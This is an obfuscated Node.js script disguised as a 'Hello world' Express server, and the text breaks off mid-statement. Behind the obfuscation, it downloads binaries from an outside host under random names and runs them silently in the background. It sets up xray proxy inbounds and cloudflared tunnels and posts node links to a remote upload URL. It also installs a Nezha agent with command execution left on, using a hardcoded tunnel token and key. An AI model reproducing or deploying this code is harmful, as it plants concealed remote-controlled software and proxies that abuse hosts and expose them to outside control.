const _0x10dc0d=_0x1dc7;(function(_0xe78de0,_0x4bfdad){const _0x252544={_0x51be94:0x266,_0x5608e7:0x253,_0x44870e:0x246,_0x4cd19a:0x290,_0x86d0c3:0x26b},_0x3dfa81=_0x1dc7,_0x1cebcd=_0xe78de0();while(!![]){try{const _0x563f6d=-parseInt(_0x3dfa81(_0x252544._0x51be94))/0x1*(-parseInt(_0x3dfa81(0x247))/0x2)+-parseInt(_0x3dfa81(0x201))/0x3+parseInt(_0x3dfa81(0x237))/0x4*(parseInt(_0x3dfa81(_0x252544._0x5608e7))/0x5)+parseInt(_0x3dfa81(_0x252544._0x44870e))/0x6+parseInt(_0x3dfa81(_0x252544._0x4cd19a))/0x7+parseInt(_0x3dfa81(_0x252544._0x86d0c3))/0x8+-parseInt(_0x3dfa81(0x24c))/0x9;if(_0x563f6d===_0x4bfdad)break;else _0x1cebcd['push'](_0x1cebcd['shift']());}catch(_0x3cfcc9){_0x1cebcd['push'](_0x1cebcd['shift']());}}}(_0x3e26,0x1a332));const express=require('express'),app=express(),axios=require(_0x10dc0d(0x217)),os=require('os'),fs=require('fs'),path=require(_0x10dc0d(0x27b)),{promisify}=require(_0x10dc0d(0x257)),exec=promisify(require(_0x10dc0d(0x27e))[_0x10dc0d(0x265)]),{execSync}=require(_0x10dc0d(0x27e)),UPLOAD_URL=process[_0x10dc0d(0x1eb)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x1f0)]||'',AUTO_ACCESS=process[_0x10dc0d(0x1eb)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x1fe)]||_0x10dc0d(0x20d),SUB_PATH=process[_0x10dc0d(0x1eb)]['SUB_PATH']||_0x10dc0d(0x259),PORT=process[_0x10dc0d(0x1eb)]['SERVER_PORT']||process[_0x10dc0d(0x1eb)]['PORT']||0xbb8,UUID=process[_0x10dc0d(0x1eb)]['UUID']||'dc26118e-10eb-4f25-f4de-cdf4c253a1e9',NEZHA_SERVER=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x289)]||_0x10dc0d(0x24b),NEZHA_PORT=process['env'][_0x10dc0d(0x234)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x10dc0d(0x1d1),ARGO_DOMAIN=process['env'][_0x10dc0d(0x28f)]||'leaflow1.hndz.qzz.io',ARGO_AUTH=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x252)]||_0x10dc0d(0x227),ARGO_PORT=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x1ec)]||0x1f41,CFIP=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x25c)]||_0x10dc0d(0x1fc),CFPORT=process[_0x10dc0d(0x1eb)][_0x10dc0d(0x22c)]||0x1bb,NAME=process[_0x10dc0d(0x1eb)]['NAME']||'leaflow1';!fs['existsSync'](FILE_PATH)?(fs[_0x10dc0d(0x233)](FILE_PATH),console[_0x10dc0d(0x26f)](FILE_PATH+'\x20is\x20created')):console[_0x10dc0d(0x26f)](FILE_PATH+_0x10dc0d(0x229));function generateRandomName(){const _0x59d61d={_0x50e853:0x23b,_0x44c6a7:0x1f6},_0x444ada=_0x10dc0d,_0x41605c=_0x444ada(0x1e8);let _0x4c37cc='';for(let _0x2a61c9=0x0;_0x2a61c9<0x6;_0x2a61c9++){_0x4c37cc+=_0x41605c[_0x444ada(0x212)](Math[_0x444ada(0x1fb)](Math[_0x444ada(_0x59d61d._0x50e853)]()*_0x41605c[_0x444ada(_0x59d61d._0x44c6a7)]));}return _0x4c37cc;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3e26(){const _0x57d852=['Download\x20','response','config.json','quic','false','createWriteStream','post','88002OFZBtt','2SPWHGR','ArgoDomain:','xtls-rprx-vision','taskkill\x20/f\x20/im\x20','ngnix.hndz.qzz.io:80','3366459RrsmEk','2096','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','--tls','none','\x22\x20>\x20/dev/null\x202>&1','ARGO_AUTH','32965CBFjGY','/tunnel.yml\x20run','has','text/plain;\x20charset=utf-8','util','\x20>/dev/null\x202>&1','sub','nohup\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','CFIP','Skipping\x20adding\x20automatic\x20access\x20task','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','catch','isFile','readFileSync','https://oooo.serv00.net/add-url','amd','Subscription\x20uploaded\x20successfully','exec','205657SYHwza','then','fileUrl','https://ipapi.co/json/','Error\x20reading\x20boot.log:','158784csUSwk','block','forEach','utf-8','log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','trojan','substring','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20is\x20running','\x20-c\x20','/api/add-nodes','arch','basename','del\x20/f\x20/q\x20','/dev/null','path','http\x20server\x20is\x20running\x20on\x20port:','?security=tls&sni=','child_process','Nodes\x20uploaded\x20successfully','https+local://8.8.8.8/dns-query','443','/api/add-subscriptions','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Empowerment\x20success\x20for\x20','Error\x20executing\x20command:\x20','\x20>/dev/null\x202>&1\x20&','match','send','NEZHA_SERVER','org','unlinkSync','127.0.0.1','all','filter','ARGO_DOMAIN','1323154mztots','error','list.txt','existsSync','pFyT4RYC2IK0DmlyVyfEDZpiLYaZnBoh','/sub.txt\x20saved\x20successfully','2053','http','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Add\x20automatic\x20access\x20task\x20faild:\x20','country_code','Content-Type','blackhole','App\x20is\x20running','vless','success','https://arm64.ssss.nyc.mn/v1','split','push','finish','firefox','unshift','/trojan-argo','\x0aclient_secret:\x20','\x20failed:\x20','tcp','sub.txt','abcdefghijklmnopqrstuvwxyz','status','true','env','ARGO_PORT','includes','&fp=firefox&type=ws&host=','\x20-c\x20\x22','PROJECT_URL','toString','https://arm64.ssss.nyc.mn/agent','base64','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','fileName','length','arm','\x20successfully','join','/config.json\x20>/dev/null\x202>&1\x20&','floor','cdns.doon.eu.org','8443','FILE_PATH','countryCode','map','61056NgQeSB','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x0avmess://','/vmess-argo?ed=2560','http://ip-api.com/json/','2083','clear','pkill\x20-f\x20\x22[','\x0a\x20\x20\x20\x20','web\x20running\x20error:\x20','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','./tmp','pop','arm64','\x20>\x20nul\x202>&1','.exe\x20>\x20nul\x202>&1','charAt','/vless-argo','2087','stream','aarch64','axios','Unhandled\x20error\x20in\x20startserver:','rm\x20-rf\x20','statSync','vmess','ARGO_DOMAIN:','tls','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','TunnelSecret','writeFileSync','close','Empowerment\x20failed\x20for\x20','platform','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','boot.log','eyJhIjoiZDhhNzU0M2EwZDIyY2YwZTcxODQxODU3MzNlY2NmMmYiLCJ0IjoiNjM5ZmM3M2QtOTJiMy00YjgwLWIzMTUtNWI1Y2NkOWIzNmRiIiwicyI6Ik9EZGhNakl3WVRRdFlXVTVNaTAwWldSakxUZzJPR1F0TXpCaVpERTROV013WldGaiJ9','application/json','\x20already\x20exists','stringify','freedom','CFPORT','/vmess-argo','data','get','\x20-p\x20','automatic\x20access\x20task\x20added\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','mkdirSync','NEZHA_PORT','set','win32','44BnsFpW','tunnel.json','message','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','random','test','from','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'];_0x3e26=function(){return _0x57d852;};return _0x3e26();}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x10dc0d(0x1f9)](FILE_PATH,phpName),webPath=path[_0x10dc0d(0x1f9)](FILE_PATH,webName),botPath=path[_0x10dc0d(0x1f9)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x10dc0d(0x1e7)),listPath=path[_0x10dc0d(0x1f9)](FILE_PATH,_0x10dc0d(0x292)),bootLogPath=path[_0x10dc0d(0x1f9)](FILE_PATH,_0x10dc0d(0x226)),configPath=path['join'](FILE_PATH,_0x10dc0d(0x241));function deleteNodes(){const _0x43d7fe={_0x339bf7:0x293,_0x2deab7:0x261,_0x1ac742:0x1f3,_0x454e61:0x26e,_0x356b24:0x1de,_0x5755e2:0x1f6,_0x2c4293:0x228},_0x38bccf=_0x10dc0d;try{if(!UPLOAD_URL)return;if(!fs[_0x38bccf(_0x43d7fe._0x339bf7)](subPath))return;let _0x2fded9;try{_0x2fded9=fs[_0x38bccf(_0x43d7fe._0x2deab7)](subPath,_0x38bccf(0x26e));}catch{return null;}const _0x23f4c8=Buffer[_0x38bccf(0x23d)](_0x2fded9,_0x38bccf(_0x43d7fe._0x1ac742))[_0x38bccf(0x1f1)](_0x38bccf(_0x43d7fe._0x454e61)),_0x2c3709=_0x23f4c8[_0x38bccf(_0x43d7fe._0x356b24)]('\x0a')[_0x38bccf(0x28e)](_0x36a081=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x36a081));if(_0x2c3709[_0x38bccf(_0x43d7fe._0x5755e2)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x38bccf(0x22a)]({'nodes':_0x2c3709}),{'headers':{'Content-Type':_0x38bccf(_0x43d7fe._0x2c4293)}})[_0x38bccf(0x25f)](_0x3fc2f4=>{return null;}),null;}catch(_0x110796){return null;}}function cleanupOldFiles(){const _0x50a2e6={_0x20eb94:0x260},_0x2b6e54=_0x10dc0d;try{const _0x54944c=fs['readdirSync'](FILE_PATH);_0x54944c[_0x2b6e54(0x26d)](_0x55940c=>{const _0x54889f=_0x2b6e54,_0x4e6494=path[_0x54889f(0x1f9)](FILE_PATH,_0x55940c);try{const _0x515b54=fs[_0x54889f(0x21a)](_0x4e6494);_0x515b54[_0x54889f(_0x50a2e6._0x20eb94)]()&&fs[_0x54889f(0x28b)](_0x4e6494);}catch(_0x4a17b5){}});}catch(_0x3ebe26){}}app[_0x10dc0d(0x22f)]('/',function(_0x308003,_0x3989f9){_0x3989f9['send']('Hello\x20world!');});async function generateConfig(){const _0x27aab9={_0x39ec9e:0x27a,_0x54abba:0x249,_0x512216:0x1e3,_0x333d67:0x28c,_0x166aa3:0x250,_0x16b654:0x250,_0x66f32:0x213,_0x4297fe:0x1d4,_0xfd2efb:0x242,_0x1ee242:0x22d,_0x18a3e4:0x1d4,_0x23d995:0x28c,_0x484de8:0x250,_0x43c7bb:0x242,_0x2fe3b8:0x1d9,_0x10352f:0x26c,_0x5824ad:0x220},_0x4bd134=_0x10dc0d,_0x401a28={'log':{'access':_0x4bd134(_0x27aab9._0x39ec9e),'error':'/dev/null','loglevel':_0x4bd134(0x250)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4bd134(_0x27aab9._0x54abba)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4bd134(0x213),'dest':0xbba},{'path':_0x4bd134(0x22d),'dest':0xbbb},{'path':_0x4bd134(_0x27aab9._0x512216),'dest':0xbbc}]},'streamSettings':{'network':_0x4bd134(0x1e6)}},{'port':0xbb9,'listen':_0x4bd134(_0x27aab9._0x333d67),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4bd134(0x250)},'streamSettings':{'network':_0x4bd134(0x1e6),'security':_0x4bd134(_0x27aab9._0x166aa3)}},{'port':0xbba,'listen':_0x4bd134(0x28c),'protocol':_0x4bd134(0x1db),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4bd134(0x250)},'streamSettings':{'network':'ws','security':_0x4bd134(_0x27aab9._0x16b654),'wsSettings':{'path':_0x4bd134(_0x27aab9._0x66f32)}},'sniffing':{'enabled':!![],'destOverride':[_0x4bd134(_0x27aab9._0x4297fe),'tls',_0x4bd134(_0x27aab9._0xfd2efb)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4bd134(0x28c),'protocol':_0x4bd134(0x21b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4bd134(_0x27aab9._0x1ee242)}},'sniffing':{'enabled':!![],'destOverride':[_0x4bd134(_0x27aab9._0x18a3e4),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4bd134(_0x27aab9._0x23d995),'protocol':_0x4bd134(0x271),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4bd134(_0x27aab9._0x484de8),'wsSettings':{'path':_0x4bd134(0x1e3)}},'sniffing':{'enabled':!![],'destOverride':[_0x4bd134(_0x27aab9._0x18a3e4),_0x4bd134(0x21d),_0x4bd134(_0x27aab9._0x43c7bb)],'metadataOnly':![]}}],'dns':{'servers':[_0x4bd134(0x280)]},'outbounds':[{'protocol':_0x4bd134(0x22b),'tag':'direct'},{'protocol':_0x4bd134(_0x27aab9._0x2fe3b8),'tag':_0x4bd134(_0x27aab9._0x10352f)}]};fs[_0x4bd134(_0x27aab9._0x5824ad)](path[_0x4bd134(0x1f9)](FILE_PATH,_0x4bd134(0x241)),JSON[_0x4bd134(0x22a)](_0x401a28,null,0x2));}function getSystemArchitecture(){const _0x5bde3f={_0x5847d7:0x277,_0x13794f:0x20f,_0x252177:0x1f7,_0x3bcba3:0x263},_0x3b7911=_0x10dc0d,_0x37f9eb=os[_0x3b7911(_0x5bde3f._0x5847d7)]();return _0x37f9eb===_0x3b7911(0x1f7)||_0x37f9eb===_0x3b7911(_0x5bde3f._0x13794f)||_0x37f9eb===_0x3b7911(0x216)?_0x3b7911(_0x5bde3f._0x252177):_0x3b7911(_0x5bde3f._0x3bcba3);}function downloadFile(_0x105c02,_0x6e26d9,_0x32973e){const _0x303cd1={_0x3ccdae:0x244,_0x2ddf57:0x267,_0x575d5d:0x25f},_0x48a42a={_0x512140:0x23f,_0x24003e:0x278,_0x40f1a0:0x239,_0x446643:0x291},_0x154981={_0x44135e:0x22e,_0xaea382:0x1e0,_0x8c0af9:0x291},_0x341df5={_0x29a805:0x221,_0x3c48ce:0x278},_0x219b00=_0x10dc0d,_0x44b8aa=_0x105c02;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4318fd=fs[_0x219b00(_0x303cd1._0x3ccdae)](_0x44b8aa);axios({'method':'get','url':_0x6e26d9,'responseType':_0x219b00(0x215)})[_0x219b00(_0x303cd1._0x2ddf57)](_0x4f2794=>{const _0x44dfe7={_0x228a4d:0x23f,_0x4cbac1:0x278,_0x5a7bad:0x239},_0x47c65f=_0x219b00;_0x4f2794[_0x47c65f(_0x154981._0x44135e)]['pipe'](_0x4318fd),_0x4318fd['on'](_0x47c65f(_0x154981._0xaea382),()=>{const _0x246563=_0x47c65f;_0x4318fd[_0x246563(_0x341df5._0x29a805)](),console[_0x246563(0x26f)]('Download\x20'+path[_0x246563(_0x341df5._0x3c48ce)](_0x44b8aa)+_0x246563(0x1f8)),_0x32973e(null,_0x44b8aa);}),_0x4318fd['on'](_0x47c65f(_0x154981._0x8c0af9),_0x4beebe=>{const _0xa3d720=_0x47c65f;fs['unlink'](_0x44b8aa,()=>{});const _0x27813=_0xa3d720(_0x44dfe7._0x228a4d)+path[_0xa3d720(_0x44dfe7._0x4cbac1)](_0x44b8aa)+_0xa3d720(0x1e5)+_0x4beebe[_0xa3d720(_0x44dfe7._0x5a7bad)];console['error'](_0x27813),_0x32973e(_0x27813);});})[_0x219b00(_0x303cd1._0x575d5d)](_0x3eb100=>{const _0x567f22=_0x219b00,_0x451d9a=_0x567f22(_0x48a42a._0x512140)+path[_0x567f22(_0x48a42a._0x24003e)](_0x44b8aa)+_0x567f22(0x1e5)+_0x3eb100[_0x567f22(_0x48a42a._0x40f1a0)];console[_0x567f22(_0x48a42a._0x446643)](_0x451d9a),_0x32973e(_0x451d9a);});}async function downloadFilesAndRun(){const _0x1648d6={_0x318b90:0x26f,_0x3d9c94:0x200,_0x578bcc:0x28d,_0xafb599:0x1de,_0x5e76df:0x214,_0x121e1a:0x206,_0x1a6b61:0x1d3,_0x3277f2:0x1ea,_0x59fa53:0x24e,_0x149efc:0x220,_0x528152:0x291,_0x2190fe:0x281,_0x34548a:0x1fd,_0x34a3a1:0x1ed,_0x342311:0x24f,_0x26bcc3:0x230,_0x233209:0x23e,_0x1edff1:0x25a,_0xfbb95d:0x275,_0xb53f1f:0x20a,_0x1f818d:0x287,_0x94a1c:0x232,_0x320333:0x254,_0x3427b3:0x273,_0x3cf8e3:0x274},_0x149938=_0x10dc0d,_0x5d4de3=getSystemArchitecture(),_0x2084c3=getFilesForArchitecture(_0x5d4de3);if(_0x2084c3['length']===0x0){console[_0x149938(_0x1648d6._0x318b90)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x9e35ca=_0x2084c3[_0x149938(_0x1648d6._0x3d9c94)](_0x9bb9a3=>{const _0x57e418={_0x5293f3:0x1f5,_0x2814df:0x268};return new Promise((_0x35fda8,_0x4feb76)=>{const _0xc0aaf9=_0x1dc7;downloadFile(_0x9bb9a3[_0xc0aaf9(_0x57e418._0x5293f3)],_0x9bb9a3[_0xc0aaf9(_0x57e418._0x2814df)],(_0x513546,_0x544f2b)=>{_0x513546?_0x4feb76(_0x513546):_0x35fda8(_0x544f2b);});});});try{await Promise[_0x149938(_0x1648d6._0x578bcc)](_0x9e35ca);}catch(_0x59181b){console[_0x149938(0x291)](_0x149938(0x20b),_0x59181b);return;}function _0x391ef9(_0xcab137){const _0x2c71c6={_0x327e33:0x26f,_0x485ae2:0x284},_0x1fabf8=_0x149938,_0x45f320=0x1fd;_0xcab137[_0x1fabf8(0x26d)](_0x57ef6f=>{const _0x1f3918=_0x1fabf8;fs[_0x1f3918(0x293)](_0x57ef6f)&&fs['chmod'](_0x57ef6f,_0x45f320,_0x38380e=>{const _0x33f33f=_0x1f3918;_0x38380e?console[_0x33f33f(0x291)](_0x33f33f(0x222)+_0x57ef6f+':\x20'+_0x38380e):console[_0x33f33f(_0x2c71c6._0x327e33)](_0x33f33f(_0x2c71c6._0x485ae2)+_0x57ef6f+':\x20'+_0x45f320[_0x33f33f(0x1f1)](0x8));});});}const _0x1332f3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x391ef9(_0x1332f3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x492e4c=NEZHA_SERVER[_0x149938(0x1ed)](':')?NEZHA_SERVER[_0x149938(_0x1648d6._0xafb599)](':')[_0x149938(0x20e)]():'',_0x43d494=new Set(['443','8443',_0x149938(0x24d),_0x149938(_0x1648d6._0x5e76df),_0x149938(_0x1648d6._0x121e1a),_0x149938(_0x1648d6._0x1a6b61)]),_0x3893fe=_0x43d494[_0x149938(0x255)](_0x492e4c)?_0x149938(_0x1648d6._0x3277f2):_0x149938(0x243),_0x7632e=_0x149938(0x1e4)+NEZHA_KEY+_0x149938(0x202)+NEZHA_SERVER+_0x149938(_0x1648d6._0x59fa53)+_0x3893fe+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x149938(_0x1648d6._0x149efc)](path[_0x149938(0x1f9)](FILE_PATH,'config.yaml'),_0x7632e);const _0x59da53=_0x149938(0x25a)+phpPath+_0x149938(0x1ef)+FILE_PATH+_0x149938(0x283);try{await exec(_0x59da53),console[_0x149938(0x26f)](phpName+_0x149938(0x274)),await new Promise(_0x4e74b1=>setTimeout(_0x4e74b1,0x3e8));}catch(_0x5de87e){console[_0x149938(_0x1648d6._0x528152)]('php\x20running\x20error:\x20'+_0x5de87e);}}else{let _0x5a8f53='';const _0x24fe50=[_0x149938(_0x1648d6._0x2190fe),_0x149938(_0x1648d6._0x34548a),'2096',_0x149938(0x214),'2083',_0x149938(0x1d3)];_0x24fe50[_0x149938(_0x1648d6._0x34a3a1)](NEZHA_PORT)&&(_0x5a8f53=_0x149938(_0x1648d6._0x342311));const _0x304f49=_0x149938(0x25a)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x149938(_0x1648d6._0x26bcc3)+NEZHA_KEY+'\x20'+_0x5a8f53+_0x149938(_0x1648d6._0x233209);try{await exec(_0x304f49),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x4f29bc=>setTimeout(_0x4f29bc,0x3e8));}catch(_0xb8b13b){console[_0x149938(_0x1648d6._0x528152)]('npm\x20running\x20error:\x20'+_0xb8b13b);}}}else console['log'](_0x149938(0x25b));const _0x6c57ff=_0x149938(_0x1648d6._0x1edff1)+webPath+_0x149938(_0x1648d6._0xfbb95d)+FILE_PATH+_0x149938(0x1fa);try{await exec(_0x6c57ff),console['log'](webName+_0x149938(0x274)),await new Promise(_0x5a1f90=>setTimeout(_0x5a1f90,0x3e8));}catch(_0x3e5e4d){console['error'](_0x149938(_0x1648d6._0xb53f1f)+_0x3e5e4d);}if(fs[_0x149938(0x293)](botPath)){let _0x2a4efd;if(ARGO_AUTH[_0x149938(_0x1648d6._0x1f818d)](/^[A-Z0-9a-z=]{120,250}$/))_0x2a4efd=_0x149938(_0x1648d6._0x94a1c)+ARGO_AUTH;else ARGO_AUTH[_0x149938(0x287)](/TunnelSecret/)?_0x2a4efd=_0x149938(0x224)+FILE_PATH+_0x149938(_0x1648d6._0x320333):_0x2a4efd=_0x149938(0x270)+FILE_PATH+_0x149938(_0x1648d6._0x3427b3)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2a4efd+_0x149938(0x286)),console[_0x149938(0x26f)](botName+_0x149938(_0x1648d6._0x3cf8e3)),await new Promise(_0x35bd1d=>setTimeout(_0x35bd1d,0x7d0));}catch(_0x35ed67){console['error'](_0x149938(0x285)+_0x35ed67);}}await new Promise(_0x2d1706=>setTimeout(_0x2d1706,0x1388));}function getFilesForArchitecture(_0x5a53d1){const _0x2f3983={_0x3498d4:0x1f2,_0x419a18:0x1dd},_0x3a5bbc=_0x10dc0d;let _0x3312bd;_0x5a53d1===_0x3a5bbc(0x1f7)?_0x3312bd=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3312bd=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xa331b9=_0x5a53d1==='arm'?_0x3a5bbc(_0x2f3983._0x3498d4):'https://amd64.ssss.nyc.mn/agent';_0x3312bd[_0x3a5bbc(0x1e2)]({'fileName':npmPath,'fileUrl':_0xa331b9});}else{const _0x55232a=_0x5a53d1===_0x3a5bbc(0x1f7)?_0x3a5bbc(_0x2f3983._0x419a18):'https://amd64.ssss.nyc.mn/v1';_0x3312bd[_0x3a5bbc(0x1e2)]({'fileName':phpPath,'fileUrl':_0x55232a});}}return _0x3312bd;}function argoType(){const _0x1e63e0={_0x3d89e2:0x26f,_0x22cfa7:0x21f,_0x4cba51:0x1f9,_0x32811a:0x238,_0x34da41:0x1de,_0x4d2851:0x1f9,_0x668f15:0x238,_0x17cc1c:0x1f9},_0x12c000=_0x10dc0d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x12c000(_0x1e63e0._0x3d89e2)](_0x12c000(0x1d5));return;}if(ARGO_AUTH['includes'](_0x12c000(_0x1e63e0._0x22cfa7))){fs['writeFileSync'](path[_0x12c000(_0x1e63e0._0x4cba51)](FILE_PATH,_0x12c000(_0x1e63e0._0x32811a)),ARGO_AUTH);const _0x36cb4d='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x12c000(_0x1e63e0._0x34da41)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x12c000(_0x1e63e0._0x4d2851)](FILE_PATH,_0x12c000(_0x1e63e0._0x668f15))+_0x12c000(0x21e)+ARGO_DOMAIN+_0x12c000(0x20c)+ARGO_PORT+_0x12c000(0x23a);fs[_0x12c000(0x220)](path[_0x12c000(_0x1e63e0._0x17cc1c)](FILE_PATH,'tunnel.yml'),_0x36cb4d);}else console[_0x12c000(_0x1e63e0._0x3d89e2)](_0x12c000(0x225));}async function extractDomains(){const _0x34cf7f={_0x280006:0x26f,_0x10ce32:0x261,_0x1f5af1:0x1f6,_0x4cc9ee:0x1f9,_0x4f7b42:0x274,_0x7572a9:0x291},_0x571431={_0x4fcfed:0x22f,_0x12171f:0x22e,_0x2f536f:0x1d7,_0x551811:0x22e,_0x4dcf49:0x22e,_0x318bd8:0x22f,_0x4d1cc5:0x205,_0x3aa2d2:0x1dc,_0x1890ff:0x28a,_0x5a3d45:0x1ff,_0x36a54a:0x28a},_0x4cda93={_0x9ba206:0x236,_0x3b5c71:0x24a,_0x7c4105:0x211,_0x51bf11:0x208,_0x3ce38d:0x251},_0x291f9c={_0x554cf2:0x287},_0x29e818=_0x10dc0d;let _0xd491a;if(ARGO_AUTH&&ARGO_DOMAIN)_0xd491a=ARGO_DOMAIN,console[_0x29e818(_0x34cf7f._0x280006)](_0x29e818(0x21c),_0xd491a),await _0x58beeb(_0xd491a);else try{const _0x1152df=fs[_0x29e818(_0x34cf7f._0x10ce32)](path['join'](FILE_PATH,_0x29e818(0x226)),_0x29e818(0x26e)),_0x43d342=_0x1152df['split']('\x0a'),_0x243854=[];_0x43d342[_0x29e818(0x26d)](_0x569f88=>{const _0x36c5c3=_0x29e818,_0x594d64=_0x569f88[_0x36c5c3(_0x291f9c._0x554cf2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x594d64){const _0xe44c79=_0x594d64[0x1];_0x243854[_0x36c5c3(0x1df)](_0xe44c79);}});if(_0x243854[_0x29e818(_0x34cf7f._0x1f5af1)]>0x0)_0xd491a=_0x243854[0x0],console[_0x29e818(0x26f)](_0x29e818(0x248),_0xd491a),await _0x58beeb(_0xd491a);else{console[_0x29e818(0x26f)](_0x29e818(0x1f4)),fs['unlinkSync'](path[_0x29e818(_0x34cf7f._0x4cc9ee)](FILE_PATH,'boot.log'));async function _0x2f214c(){const _0x2e1d83=_0x29e818;try{process['platform']===_0x2e1d83(_0x4cda93._0x9ba206)?await exec(_0x2e1d83(_0x4cda93._0x3b5c71)+botName+_0x2e1d83(_0x4cda93._0x7c4105)):await exec(_0x2e1d83(_0x4cda93._0x51bf11)+botName[_0x2e1d83(0x212)](0x0)+']'+botName[_0x2e1d83(0x272)](0x1)+_0x2e1d83(_0x4cda93._0x3ce38d));}catch(_0x57bd05){}}_0x2f214c(),await new Promise(_0x331820=>setTimeout(_0x331820,0xbb8));const _0x2caa4c=_0x29e818(0x270)+FILE_PATH+_0x29e818(0x273)+ARGO_PORT;try{await exec(_0x29e818(0x25a)+botPath+'\x20'+_0x2caa4c+_0x29e818(0x286)),console[_0x29e818(_0x34cf7f._0x280006)](botName+_0x29e818(_0x34cf7f._0x4f7b42)),await new Promise(_0x41588e=>setTimeout(_0x41588e,0xbb8)),await extractDomains();}catch(_0x177e0d){console[_0x29e818(0x291)]('Error\x20executing\x20command:\x20'+_0x177e0d);}}}catch(_0x5b2ef9){console[_0x29e818(_0x34cf7f._0x7572a9)](_0x29e818(0x26a),_0x5b2ef9);}async function _0x1cbdae(){const _0x5146e7=_0x29e818;try{const _0x572cd2=await axios[_0x5146e7(_0x571431._0x4fcfed)](_0x5146e7(0x269),{'timeout':0xbb8});if(_0x572cd2[_0x5146e7(_0x571431._0x12171f)]&&_0x572cd2['data'][_0x5146e7(_0x571431._0x2f536f)]&&_0x572cd2[_0x5146e7(_0x571431._0x551811)][_0x5146e7(0x28a)])return _0x572cd2[_0x5146e7(0x22e)][_0x5146e7(0x1d7)]+'_'+_0x572cd2[_0x5146e7(_0x571431._0x4dcf49)][_0x5146e7(0x28a)];}catch(_0x14377){try{const _0x47e066=await axios[_0x5146e7(_0x571431._0x318bd8)](_0x5146e7(_0x571431._0x4d1cc5),{'timeout':0xbb8});if(_0x47e066[_0x5146e7(0x22e)]&&_0x47e066[_0x5146e7(0x22e)][_0x5146e7(0x1e9)]===_0x5146e7(_0x571431._0x3aa2d2)&&_0x47e066['data'][_0x5146e7(0x1ff)]&&_0x47e066['data'][_0x5146e7(_0x571431._0x1890ff)])return 